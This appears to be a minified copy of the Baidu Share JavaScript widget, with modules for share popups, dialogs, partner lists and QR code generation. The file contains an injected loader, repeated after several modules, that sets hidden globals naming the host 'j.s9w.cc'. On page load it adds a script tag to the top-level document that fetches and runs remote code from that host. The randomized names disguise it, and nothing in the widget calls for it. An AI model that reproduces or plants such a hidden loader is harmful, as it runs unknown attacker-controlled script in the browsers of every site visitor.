e.render=="function"&&e.render(e.transition(e.percent)),e.dispatchEvent("onafterupdate"),e["timer"]=setTimeout(function(){e["pulsed"]()},e.interval)},transition:function(e){return e},cancel:function(){this["timer"]&&clearTimeout(this["timer"]),this["etime"]=this["btime"],typeof this.restore=="function"&&this.restore(),this.dispatchEvent("oncancel"),this.dispose()},end:function(){this["timer"]&&clearTimeout(this["timer"]),this["etime"]=this["btime"],this["pulsed"]()}}),i.object.each=function(e,t){var n,r,i;if("function"==typeof t)for(r in e)if(e.hasOwnProperty(r)){i=e[r],n=t.call(e,i,r);if(n===!1)break}return e},i.dom=i.dom||{},i.dom.g=function(e){return e?"string"==typeof e||e instanceof String?document.getElementById(e):!e.nodeName||e.nodeType!=1&&e.nodeType!=9?null:e:null},i.g=i.G=i.dom.g,i.dom._g=function(e){return i.lang.isString(e)?document.getElementById(e):e},i._g=i.dom._g,i.dom.getDocument=function(e){return e=i.dom.g(e),e.nodeType==9?e:e.ownerDocument||e.document},i.dom.getComputedStyle=function(e,t){e=i.dom._g(e);var n=i.dom.getDocument(e),r;if(n.defaultView&&n.defaultView.getComputedStyle){r=n.defaultView.getComputedStyle(e,null);if(r)return r[t]||r.getPropertyValue(t)}return""},i.dom._styleFixer=i.dom._styleFixer||{},i.dom._styleFilter=i.dom._styleFilter||[],i.dom._styleFilter.filter=function(e,t,n){for(var r=0,s=i.dom._styleFilter,o;o=s[r];r++)if(o=o[n])t=o(e,t);return t},i.string=i.string||{},i.string.toCamelCase=function(e){return e.indexOf("-")<0&&e.indexOf("_")<0?e:e.replace(/[-_][^-_]/g,function(e){return e.charAt(1).toUpperCase()})},i.dom.getStyle=function(e,t){var n=i.dom;e=n.g(e),t=i.string.toCamelCase(t);var r=e.style[t]||(e.currentStyle?e.currentStyle[t]:"")||n.getComputedStyle(e,t);if(!r||r=="auto"){var s=n._styleFixer[t];s&&(r=s.get?s.get(e,t,r):i.dom.getStyle(e,s))}if(s=n._styleFilter)r=s.filter(t,r,"get");return r},i.getStyle=i.dom.getStyle,i.dom.setStyle=function(e,t,n){var r=i.dom,s;e=r.g(e),t=i.string.toCamelCase(t);if(s=r._styleFilter)n=s.filter(t,n,"set");return s=r._styleFixer[t],s&&s.set?s.set(e,n,t):e.style[s||t]=n,e},i.setStyle=i.dom.setStyle,r.undope=!0;var s=function(e,t,n,s,o){var e=r.g(e);if(!e)return;var u=new i.fx.Timeline({duration:n||400}),a={};r.object.each(t,function(t,n){var i=parseInt(r.dom.getStyle(e,n)),s=parseInt(t),o=s-i;a[n]={gap:o,start:i,end:s}}),u.transition=function(e){return e*(2-e)},u.render=function(n){r.object.each(t,function(t,i){var s=a[i];r.dom.setStyle(e,i,n*s.gap+s.start+"px")}),o&&o(n)},u.finish=function(){r.object.each(t,function(t,n){var i=a[n];r.dom.setStyle(e,n,i.end+"px")}),s&&s()},u.launch()};t.animate=s});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("component/anticheat",function(e,t,n){var r=e("base/tangram").T,i,s,o=function(e,t){var n=r(t).offset(),i={left:e.pageX,top:e.pageY};return{left:Math.floor(i.left-n.left),top:Math.floor(i.top-n.top)}},u=function(e,t){typeof i=="undefined"&&(i=Math.floor(e.pageX),s=Math.floor(e.pageY));if(t){var n=o(e,t);r(t).data("over_x",n.left).data("over_y",n.top).data("over_time",+(new Date))}},a=function(e,t){var n=o(e,t);r(t).data("click_x",n.left).data("click_y",n.top)},f=function(e,t,n){e=="mouseenter"?u(t,n):e=="mouseclick"&&a(t,n)},l=function(e){var t=r(e.__element),n=e.__buttonType,o=t.data("over_x")||0,u=t.data("over_y")||0,a=t.data("click_x"),f=t.data("click_y"),l=t.innerWidth(),c=t.innerHeight(),h=new Date-t.data("over_time"),p=document.body.offsetWidth,d=document.body.offsetHeight,v=window.screen.availWidth,m=window.screen.availHeight;return[i,s,n>0?1:0,o,u,a,f,l,c,n,h,p,d,v,m].join(".")};t.process=f,t.getSloc=l});
!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("component/comm_tools",function(e,t){var n=function(){var e=window.location||document.location||{};return e.href||""},r=function(e,t){var n=e.length,r="";for(var i=1;i<=t;i++){var s=Math.floor(n*Math.random());r+=e.charAt(s)}return r},i=function(){var e=(+(new Date)).toString(36),t=r("0123456789abcdefghijklmnopqrstuvwxyz",3);return e+t};t.getLinkId=i,t.getPageUrl=n});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("component/partners",function(e,t){t.partners={evernotecn:{name:"\u5370\u8c61\u7b14\u8bb0"},h163:{name:"\u7f51\u6613\u70ed"},mshare:{name:"\u4e00\u952e\u5206\u4eab"},qzone:{name:"QQ\u7a7a\u95f4"},tsina:{name:"\u65b0\u6d6a\u5fae\u535a"},renren:{name:"\u4eba\u4eba\u7f51"},tqq:{name:"\u817e\u8baf\u5fae\u535a"},bdxc:{name:"\u767e\u5ea6\u76f8\u518c"},kaixin001:{name:"\u5f00\u5fc3\u7f51"},tqf:{name:"\u817e\u8baf\u670b\u53cb"},tieba:{name:"\u767e\u5ea6\u8d34\u5427"},douban:{name:"\u8c46\u74e3\u7f51"},bdhome:{name:"\u767e\u5ea6\u65b0\u9996\u9875"},sqq:{name:"QQ\u597d\u53cb"},thx:{name:"\u548c\u8baf\u5fae\u535a"},bdysc:{name:"\u767e\u5ea6\u4e91\u6536\u85cf"},meilishuo:{name:"\u7f8e\u4e3d\u8bf4"},mogujie:{name:"\u8611\u83c7\u8857"},diandian:{name:"\u70b9\u70b9\u7f51"},huaban:{name:"\u82b1\u74e3"},duitang:{name:"\u5806\u7cd6"},hx:{name:"\u548c\u8baf"},fx:{name:"\u98de\u4fe1"},youdao:{name:"\u6709\u9053\u4e91\u7b14\u8bb0"},sdo:{name:"\u9ea6\u5e93\u8bb0\u4e8b"},qingbiji:{name:"\u8f7b\u7b14\u8bb0"},people:{name:"\u4eba\u6c11\u5fae\u535a"},xinhua:{name:"\u65b0\u534e\u5fae\u535a"},mail:{name:"\u90ae\u4ef6\u5206\u4eab"},isohu:{name:"\u6211\u7684\u641c\u72d0"},yaolan:{name:"\u6447\u7bee\u7a7a\u95f4"},wealink:{name:"\u82e5\u90bb\u7f51"},ty:{name:"\u5929\u6daf\u793e\u533a"},fbook:{name:"Facebook"},twi:{name:"Twitter"},linkedin:{name:"linkedin"},copy:{name:"\u590d\u5236\u7f51\u5740"},print:{name:"\u6253\u5370"},ibaidu:{name:"\u767e\u5ea6\u4e2d\u5fc3"},weixin:{name:"\u5fae\u4fe1"},iguba:{name:"\u80a1\u5427"}},t.partnerSort=["mshare","qzone","tsina","bdysc","weixin","renren","tqq","bdxc","kaixin001","tqf","tieba","douban","bdhome","sqq","thx","ibaidu","meilishuo","mogujie","diandian","huaban","duitang","hx","fx","youdao","sdo","qingbiji","people","xinhua","mail","isohu","yaolan","wealink","ty","iguba","fbook","twi","linkedin","h163","evernotecn","copy","print"]});
window._bd_share_main.F.module("component/pop_base",function(e,t,n){var r=e("base/tangram").T,i=e("conf/const"),s=e("base/class").Class;t.PopBase=s.create(function(t){function s(e){r(e).click(function(e){e=r.event(e||window.event);var t=o(e.target);t&&(e.preventDefault(),n.fire("clickact",{cmd:r(t).attr(n._actBtnSet.cmdAttr),element:t,event:e,buttonType:n._poptype}))}).mouseover(function(e){var t=o(e.target);n.fire("mouseenter",{element:t,event:e}),r(t).attr("data-cmd")=="more"&&n.fire("moreover",{element:t,event:e})})}function o(e){if(u(e))return e;if(n._actBtnSet.maxDomDepth>0){var t=n._actBtnSet.maxDomDepth,i=0,s=r(e).parent().get(0),o=n.entities;while(i<t){if(u(s))return s;s=r(s).parent().get(0);if(r.array(o).contains(s)||s==document.body)break;i++}}return null}function u(e){var t=n._actBtnSet;return e&&e.tagName&&(t.className||t.tagName)?(!t.className||r(e).hasClass(t.className))&&(!t.tagName||e.tagName.toLowerCase()==t.tagName.toLowerCase())&&r(e).attr(t.cmdAttr):!1}var n=this;n._container=null,n._actBtnSet={className:"",tagName:"a",maxDomDepth:0,cmdAttr:i.CMD_ATTR},n._partners=e("component/partners").partners,n._partnerSort=e("component/partners").partnerSort,n._poptype=-1,n.show=function(e,t){window._bd_share_main.F.use("share_popup.css",function(){n._show(e,t)})},n.hide=function(){n._hide(),n.un()},n.init=function(){n._init(),s(n._container)},n._init=function(){},n._show=function(){},n._hide=function(){}})});
window._bd_share_main.F.module("component/pop_dialog",function(e,t){var n=e("base/tangram").T,r=e("base/class").Class,i=e("conf/const"),s=e("component/pop_base"),o={btn:""},u,a,f,l=r.create(function(){function t(t){t.keyCode==27&&e.hide()}function r(){var e=n.browser.ie==6?n(window).scrollTop():0,t=a.outerWidth(),r=a.outerHeight(),i=n(window).width(),s=n(window).height(),o=(s-r)/2+e,u=(i-t)/2;return{top:o>0?o:0,left:u>0?u:0}}function i(t,r){var i=n.extend({},e._partnerSort,r.bdDialogPartners),s=[];n.each(i,function(t,n){s[t]='<li><a href="#" onclick="return false;" class="popup_'+n+'" data-cmd="'+n+'">'+e._partners[n].name+"</a></li>"}),e._container.html(s.join(""))}var e=this;e._poptype=2,e._hide=function(){f&&f.hide(),a&&a.hide(),n("body").unbind("keydown",t)},e._show=function(s,o){i(e._container,o);var u=r();n.each([a,f],function(e,t){t.css({top:u.top,left:u.left}).show()}),n("body").bind("keydown",t),window._bd_share_main.F.use("trans/logger",function(e){e.dialog()})},e._init=function(){var t=['<iframe frameborder="0" class="bdshare_dialog_bg" style="display:none;"></iframe>'].join(""),r=['<div class="bdshare_dialog_box" style="display:none;">','<div class="bdshare_dialog_top">','<a class="bdshare_dialog_close" href="#" onclick="return false;" title="\u5173\u95ed"></a>\u5206\u4eab\u5230',"</div>",'<ul class="bdshare_dialog_list"></ul>','<div class="bdshare_dialog_bottom">','<a href="http://share.baidu.com/" target="_blank;">\u767e\u5ea6\u5206\u4eab</a>',"</div>","</div>"].join("");n("body").insertHTML("beforeEnd",t+r),e._container=n(".bdshare_dialog_list"),a=n(".bdshare_dialog_box"),f=n(".bdshare_dialog_bg"),n(".bdshare_dialog_close").click(e.hide)}},s.PopBase);t.Dialog=function(){return u||(u=new l,u.init()),u}()});
window._bd_share_main.F.module("component/pop_popup",function(e,t){var n=e("base/tangram").T,r=e("base/class").Class,i=e("conf/const"),s=e("component/pop_base"),o={btn:""},u,a,f,l,c=r.create(function(){function t(t,r){var i=r.bdMini||2,s=r.bdMiniList||e._partnerSort.slice(0,8*i),o=[];n.each(s,function(t,n){o[t]='<li><a href="#" onclick="return false;" class="popup_'+n+'" data-cmd="'+n+'">'+e._partners[n].name+"</a></li>"}),l.html(o.join("")),a.width(i*110+6),f.height(a.outerHeight()),f.width(a.outerWidth())}var e=this;e._poptype=1,e._hide=function(){f&&f.hide(),a&&a.hide()},e._show=function(r,i){t(e._container,i);var s=e._getPosition(r.element,i);n.each([a,f],function(e,t){t.css({top:s.top,left:s.left}).show()}),n(r.element).one("mouseout",function(){var t=!1;a.one("mouseover",function(){t=!0}),setTimeout(function(){!t&&e.hide()},300)})},e._getPosition=function(e,t){var r=n(e).offset(),i=r.top+n(e).height()+5,s=r.left,o=a.outerHeight(),u=n(window).scrollTop();if(i+o>n("body").height()&&i+o>n(window).height()||i+o>u+n(window).height())i=r.top-o-5,i=i<u?u:i;var f=t.bdPopupOffsetLeft,l=t.bdPopupOffsetTop;if(f||l)i+=l|0,s+=f|0;return{top:i,left:s}},e._init=function(){var t="bdSharePopup_"+ +(new Date),r=['<iframe frameborder="0" id="'+t+'bg" class="bdshare_popup_bg" style="display:none;"></iframe>'].join(""),i=['<div class="bdshare_popup_box" id="'+t+'box" style="display:none;">','<div class="bdshare_popup_top">',"\u5206\u4eab\u5230","</div>",'<ul class="bdshare_popup_list"></ul>','<div class="bdshare_popup_bottom">','<a href="#" onclick="return false;" class="popup_more"  data-cmd="more" target="_blank;">\u66f4\u591a...</a>',"</div>","</div>"].join("");n("body").insertHTML("beforeEnd",r+i),e._container=a=n("#"+t+"box"),l=a.find(".bdshare_popup_list"),f=n("#"+t+"bg"),a.mouseleave(e.hide)}},s.PopBase);t.Popup=function(){return u||(u=new c,u.init()),u}()});
window._bd_share_main.F.module("component/pop_popup_slide",function(e,t){var n=e("base/tangram").T,r=e("base/class").Class,i=e("conf/const"),s=e("component/pop_base"),o={btn:""},u,a,f,l,c=r.create(function(){function t(e){var t=n(e).offset(),r=t.top+n(e).height()+5,i=t.left,s=a.outerHeight();return r+s>n("body").height()&&r+s>n(window).height()&&(r=t.top-s-5,r=r<0?0:r),{top:r,left:i}}function r(t,r){var i=r.mini||2,s=r.miniList||e._partnerSort.slice(0,8*i),o=[];n.each(s,function(t,n){if(!/(iPhone | iPad | Android)/i.test(navigator.userAgent)||n!=="weixin")o[t]='<li><a href="#" onclick="return false;" class="popup_'+n+'" data-cmd="'+n+'">'+e._partners[n].name+"</a></li>"}),l.html(o.join("")),a.width(i*110+6),f.width(i*110+6)}var e=this;e._hide=function(){f&&f.hide(),a&&a.hide()},e._show=function(i,s){r(e._container,s);var o=t(i.element);n.each([a,f],function(e,t){t.css({top:o.top,left:o.left}).show()}),n(i.element).one("mouseout",function(){var t=!1;a.one("mouseover",function(){t=!0}),setTimeout(function(){!t&&e.hide()},300)})},e._init=function(){var t=['<iframe frameborder="0" class="bdshare_popup_bg" style="display:none;"></iframe>'].join(""),r=['<div class="bdshare_popup_box" style="display:none;">','<div class="bdshare_popup_top">',"\u5206\u4eab\u5230","</div>",'<ul class="bdshare_popup_list"></ul>','<div class="bdshare_popup_bottom">','<a href="http://share.baidu.com/" class="popup_more"  data-cmd="more" target="_blank;">\u66f4\u591a...</a>',"</div>","</div>"].join("");n("body").insertHTML("beforeEnd",t+r),e._container=n(".bdshare_popup_box"),a=n(".bdshare_popup_box"),l=n(".bdshare_popup_list"),f=n(".bdshare_popup_bg"),a.mouseleave(e.hide)}},s.PopBase);t.Popup=function(){return u||(u=new c,u.init()),u}()});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("component/qrcode",function(e,t){function n(e){this.mode=i.MODE_8BIT_BYTE,this.data=e}function r(e,t){this.typeNumber=e,this.errorCorrectLevel=t,this.modules=null,this.moduleCount=0,this.dataCache=null,this.dataList=new Array}function l(e,t){if(e.length==undefined)throw new Error(e.length+"/"+t);var n=0;while(n<e.length&&e[n]==0)n++;this.num=new Array(e.length-n+t);for(var r=0;r<e.length-n;r++)this.num[r]=e[r+n]}function c(e,t){this.totalCount=e,this.dataCount=t}function h(){this.buffer=new Array,this.length=0}n.prototype={getLength:function(e){return this.data.length},write:function(e){for(var t=0;t<this.data.length;t++)e.put(this.data.charCodeAt(t),8)}},r.prototype={addData:function(e){var t=new n(e);this.dataList.push(t),this.dataCache=null},isDark:function(e,t){if(e<0||this.moduleCount<=e||t<0||this.moduleCount<=t)throw new Error(e+","+t);return this.modules[e][t]},getModuleCount:function(){return this.moduleCount},make:function(){if(this.typeNumber<1){var e=1;for(e=1;e<40;e++){var t=c.getRSBlocks(e,this.errorCorrectLevel),n=new h,r=0;for(var i=0;i<t.length;i++)r+=t[i].dataCount;for(var i=0;i<this.dataList.length;i++){var s=this.dataList[i];n.put(s.mode,4),n.put(s.getLength(),u.getLengthInBits(s.mode,e)),s.write(n)}if(n.getLengthInBits()<=r*8)break}this.typeNumber=e}this.makeImpl(!1,this.getBestMaskPattern())},makeImpl:function(e,t){this.moduleCount=this.typeNumber*4+17,this.modules=new Array(this.moduleCount);for(var n=0;n<this.moduleCount;n++){this.modules[n]=new Array(this.moduleCount);for(var i=0;i<this.moduleCount;i++)this.modules[n][i]=null}this.setupPositionProbePattern(0,0),this.setupPositionProbePattern(this.moduleCount-7,0),this.setupPositionProbePattern(0,this.moduleCount-7),this.setupPositionAdjustPattern(),this.setupTimingPattern(),this.setupTypeInfo(e,t),this.typeNumber>=7&&this.setupTypeNumber(e),this.dataCache==null&&(this.dataCache=r.createData(this.typeNumber,this.errorCorrectLevel,this.dataList)),this.mapData(this.dataCache,t)},setupPositionProbePattern:function(e,t){for(var n=-1;n<=7;n++){if(e+n<=-1||this.moduleCount<=e+n)continue;for(var r=-1;r<=7;r++){if(t+r<=-1||this.moduleCount<=t+r)continue;0<=n&&n<=6&&(r==0||r==6)||0<=r&&r<=6&&(n==0||n==6)||2<=n&&n<=4&&2<=r&&r<=4?this.modules[e+n][t+r]=!0:this.modules[e+n][t+r]=!1}}},getBestMaskPattern:function(){var e=0,t=0;for(var n=0;n<8;n++){this.makeImpl(!0,n);var r=u.getLostPoint(this);if(n==0||e>r)e=r,t=n}return t},createMovieClip:function(e,t,n){var r=e.createEmptyMovieClip(t,n),i=1;this.make();for(var s=0;s<this.modules.length;s++){var o=s*i;for(var u=0;u<this.modules[s].length;u++){var a=u*i,f=this.modules[s][u];f&&(r.beginFill(0,100),r.moveTo(a,o),r.lineTo(a+i,o),r.lineTo(a+i,o+i),r.lineTo(a,o+i),r.endFill())}}return r},setupTimingPattern:function(){for(var e=8;e<this.moduleCount-8;e++){if(this.modules[e][6]!=null)continue;this.modules[e][6]=e%2==0}for(var t=8;t<this.moduleCount-8;t++){if(this.modules[6][t]!=null)continue;this.modules[6][t]=t%2==0}},setupPositionAdjustPattern:function(){var e=u.getPatternPosition(this.typeNumber);for(var t=0;t<e.length;t++)for(var n=0;n<e.length;n++){var r=e[t],i=e[n];if(this.modules[r][i]!=null)continue;for(var s=-2;s<=2;s++)for(var o=-2;o<=2;o++)s==-2||s==2||o==-2||o==2||s==0&&o==0?this.modules[r+s][i+o]=!0:this.modules[r+s][i+o]=!1}},setupTypeNumber:function(e){var t=u.getBCHTypeNumber(this.typeNumber);for(var n=0;n<18;n++){var r=!e&&(t>>n&1)==1;this.modules[Math.floor(n/3)][n%3+this.moduleCount-8-3]=r}for(var n=0;n<18;n++){var r=!e&&(t>>n&1)==1;this.modules[n%3+this.moduleCount-8-3][Math.floor(n/3)]=r}},setupTypeInfo:function(e,t){var n=this.errorCorrectLevel<<3|t,r=u.getBCHTypeInfo(n);for(var i=0;i<15;i++){var s=!e&&(r>>i&1)==1;i<6?this.modules[i][8]=s:i<8?this.modules[i+1][8]=s:this.modules[this.moduleCount-15+i][8]=s}for(var i=0;i<15;i++){var s=!e&&(r>>i&1)==1;i<8?this.modules[8][this.moduleCount-i-1]=s:i<9?this.modules[8][15-i-1+1]=s:this.modules[8][15-i-1]=s}this.modules[this.moduleCount-8][8]=!e},mapData:function(e,t){var n=-1,r=this.moduleCount-1,i=7,s=0;for(var o=this.moduleCount-1;o>0;o-=2){o==6&&o--;for(;;){for(var a=0;a<2;a++)if(this.modules[r][o-a]==null){var f=!1;s<e.length&&(f=(e[s]>>>i&1)==1);var l=u.getMask(t,r,o-a);l&&(f=!f),this.modules[r][o-a]=f,i--,i==-1&&(s++,i=7)}r+=n;if(r<0||this.moduleCount<=r){r-=n,n=-n;break}}}}},r.PAD0=236,r.PAD1=17,r.createData=function(e,t,n){var i=c.getRSBlocks(e,t),s=new h;for(var o=0;o<n.length;o++){var a=n[o];s.put(a.mode,4),s.put(a.getLength(),u.getLengthInBits(a.mode,e)),a.write(s)}var f=0;for(var o=0;o<i.length;o++)f+=i[o].dataCount;if(s.getLengthInBits()>f*8)throw new Error("code length overflow. ("+s.getLengthInBits()+">"+f*8+")");s.getLengthInBits()+4<=f*8&&s.put(0,4);while(s.getLengthInBits()%8!=0)s.putBit(!1);for(;;){if(s.getLengthInBits()>=f*8)break;s.put(r.PAD0,8);if(s.getLengthInBits()>=f*8)break;s.put(r.PAD1,8)}return r.createBytes(s,i)},r.createBytes=function(e,t){var n=0,r=0,i=0,s=new Array(t.length),o=new Array(t.length);for(var a=0;a<t.length;a++){var f=t[a].dataCount,c=t[a].totalCount-f;r=Math.max(r,f),i=Math.max(i,c),s[a]=new Array(f);for(var h=0;h<s[a].length;h++)s[a][h]=255&e.buffer[h+n];n+=f;var p=u.getErrorCorrectPolynomial(c),d=new l(s[a],p.getLength()-1),v=d.mod(p);o[a]=new Array(p.getLength()-1);for(var h=0;h<o[a].length;h++){var m=h+v.getLength()-o[a].length;o[a][h]=m>=0?v.get(m):0}}var g=0;for(var h=0;h<t.length;h++)g+=t[h].totalCount;var y=new Array(g),b=0;for(var h=0;h<r;h++)for(var a=0;a<t.length;a++)h<s[a].length&&(y[b++]=s[a][h]);for(var h=0;h<i;h++)for(var a=0;a<t.length;a++)h<o[a].length&&(y[b++]=o[a][h]);return y};var i={MODE_NUMBER:1,MODE_ALPHA_NUM:2,MODE_8BIT_BYTE:4,MODE_KANJI:8},s={L:1,M:0,Q:3,H:2},o={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7},u={PATTERN_POSITION_TABLE:[[],[6,18],[6,22],[6,26],[6,30],[6,34],[6,22,38],[6,24,42],[6,26,46],[6,28,50],[6,30,54],[6,32,58],[6,34,62],[6,26,46,66],[6,26,48,70],[6,26,50,74],[6,30,54,78],[6,30,56,82],[6,30,58,86],[6,34,62,90],[6,28,50,72,94],[6,26,50,74,98],[6,30,54,78,102],[6,28,54,80,106],[6,32,58,84,110],[6,30,58,86,114],[6,34,62,90,118],[6,26,50,74,98,122],[6,30,54,78,102,126],[6,26,52,78,104,130],[6,30,56,82,108,134],[6,34,60,86,112,138],[6,30,58,86,114,142],[6,34,62,90,118,146],[6,30,54,78,102,126,150],[6,24,50,76,102,128,154],[6,28,54,80,106,132,158],[6,32,58,84,110,136,162],[6,26,54,82,110,138,166],[6,30,58,86,114,142,170]],G15:1335,G18:7973,G15_MASK:21522,getBCHTypeInfo:function(e){var t=e<<10;while(u.getBCHDigit(t)-u.getBCHDigit(u.G15)>=0)t^=u.G15<<u.getBCHDigit(t)-u.getBCHDigit(u.G15);return(e<<10|t)^u.G15_MASK},getBCHTypeNumber:function(e){var t=e<<12;while(u.getBCHDigit(t)-u.getBCHDigit(u.G18)>=0)t^=u.G18<<u.getBCHDigit(t)-u.getBCHDigit(u.G18);return e<<12|t},getBCHDigit:function(e){var t=0;while(e!=0)t++,e>>>=1;return t},getPatternPosition:function(e){return u.PATTERN_POSITION_TABLE[e-1]},getMask:function(e,t,n){switch(e){case o.PATTERN000:return(t+n)%2==0;case o.PATTERN001:return t%2==0;case o.PATTERN010:return n%3==0;case o.PATTERN011:return(t+n)%3==0;case o.PATTERN100:return(Math.floor(t/2)+Math.floor(n/3))%2==0;case o.PATTERN101:return t*n%2+t*n%3==0;case o.PATTERN110:return(t*n%2+t*n%3)%2==0;case o.PATTERN111:return(t*n%3+(t+n)%2)%2==0;default:throw new Error("bad maskPattern:"+e)}},getErrorCorrectPolynomial:function(e){var t=new l([1],0);for(var n=0;n<e;n++)t=t.multiply(new l([1,a.gexp(n)],0));return t},getLengthInBits:function(e,t){if(1<=t&&t<10)switch(e){case i.MODE_NUMBER:return 10;case i.MODE_ALPHA_NUM:return 9;case i.MODE_8BIT_BYTE:return 8;case i.MODE_KANJI:return 8;default:throw new Error("mode:"+e)}else if(t<27)switch(e){case i.MODE_NUMBER:return 12;case i.MODE_ALPHA_NUM:return 11;case i.MODE_8BIT_BYTE:return 16;case i.MODE_KANJI:return 10;default:throw new Error("mode:"+e)}else{if(!(t<41))throw new Error("type:"+t);switch(e){case i.MODE_NUMBER:return 14;case i.MODE_ALPHA_NUM:return 13;case i.MODE_8BIT_BYTE:return 16;case i.MODE_KANJI:return 12;default:throw new Error("mode:"+e)}}},getLostPoint:function(e){var t=e.getModuleCount(),n=0;for(var r=0;r<t;r++)for(var i=0;i<t;i++){var s=0,o=e.isDark(r,i);for(var u=-1;u<=1;u++){if(r+u<0||t<=r+u)continue;for(var a=-1;a<=1;a++){if(i+a<0||t<=i+a)continue;if(u==0&&a==0)continue;o==e.isDark(r+u,i+a)&&s++}}s>5&&(n+=3+s-5)}for(var r=0;r<t-1;r++)for(var i=0;i<t-1;i++){var f=0;e.isDark(r,i)&&f++,e.isDark(r+1,i)&&f++,e.isDark(r,i+1)&&f++,e.isDark(r+1,i+1)&&f++;if(f==0||f==4)n+=3}for(var r=0;r<t;r++)for(var i=0;i<t-6;i++)e.isDark(r,i)&&!e.isDark(r,i+1)&&e.isDark(r,i+2)&&e.isDark(r,i+3)&&e.isDark(r,i+4)&&!e.isDark(r,i+5)&&e.isDark(r,i+6)&&(n+=40);for(var i=0;i<t;i++)for(var r=0;r<t-6;r++)e.isDark(r,i)&&!e.isDark(r+1,i)&&e.isDark(r+2,i)&&e.isDark(r+3,i)&&e.isDark(r+4,i)&&!e.isDark(r+5,i)&&e.isDark(r+6,i)&&(n+=40);var l=0;for(var i=0;i<t;i++)for(var r=0;r<t;r++)e.isDark(r,i)&&l++;var c=Math.abs(100*l/t/t-50)/5;return n+=c*10,n}},a={glog:function(e){if(e<1)throw new Error("glog("+e+")");return a.LOG_TABLE[e]},gexp:function(e){while(e<0)e+=255;while(e>=256)e-=255;return a.EXP_TABLE[e]},EXP_TABLE:new Array(256),LOG_TABLE:new Array(256)};for(var f=0;f<8;f++)a.EXP_TABLE[f]=1<<f;for(var f=8;f<256;f++)a.EXP_TABLE[f]=a.EXP_TABLE[f-4]^a.EXP_TABLE[f-5]^a.EXP_TABLE[f-6]^a.EXP_TABLE[f-8];for(var f=0;f<255;f++)a.LOG_TABLE[a.EXP_TABLE[f]]=f;l.prototype={get:function(e){return this.num[e]},getLength:function(){return this.num.length},multiply:function(e){var t=new Array(this.getLength()+e.getLength()-1);for(var n=0;n<this.getLength();n++)for(var r=0;r<e.getLength();r++)t[n+r]^=a.gexp(a.glog(this.get(n))+a.glog(e.get(r)));return new l(t,0)},mod:function(e){if(this.getLength()-e.getLength()<0)return this;var t=a.glog(this.get(0))-a.glog(e.get(0)),n=new Array(this.getLength());for(var r=0;r<this.getLength();r++)n[r]=this.get(r);for(var r=0;r<e.getLength();r++)n[r]^=a.gexp(a.glog(e.get(r))+t);return(new 